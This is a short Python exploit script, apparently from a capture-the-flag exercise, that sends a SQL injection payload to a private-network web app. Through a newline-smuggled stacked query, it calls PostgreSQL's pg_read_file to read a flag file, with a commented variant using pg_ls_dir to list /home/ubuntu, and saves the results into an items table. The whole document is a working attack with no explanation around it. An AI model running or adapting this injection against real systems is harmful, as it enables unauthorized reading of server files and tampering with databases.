import requests

# url = "http://10.10.67.220/?lastnseconds=-1&name=foo\x0a)%3B INSERT INTO items (name, type, status, creation_timestamp, quantity, owner_id) \x0a VALUES (pg_ls_dir($$/home/ubuntu/$$),$$File$$,$$Imported$$,EXTRACT(EPOCH FROM now()),1,1)%3B--"
url = "http://10.10.67.220/?lastnseconds=-1&name=foo\x0a)%3B INSERT INTO items (name, type, status, creation_timestamp, quantity, owner_id) \x0a VALUES (pg_read_file($$/home/ubuntu/flag-12376287432546781647235.txt$$, 0, 10000),$$File$$,$$Imported$$,EXTRACT(EPOCH FROM now()),1,1)%3B--"

response = requests.get(url)
if response.status_code == 200:
    print("Request was successful.")
else:
    print(f"Request failed with status code: {response.status_code}")

print("Response content:", response.text)
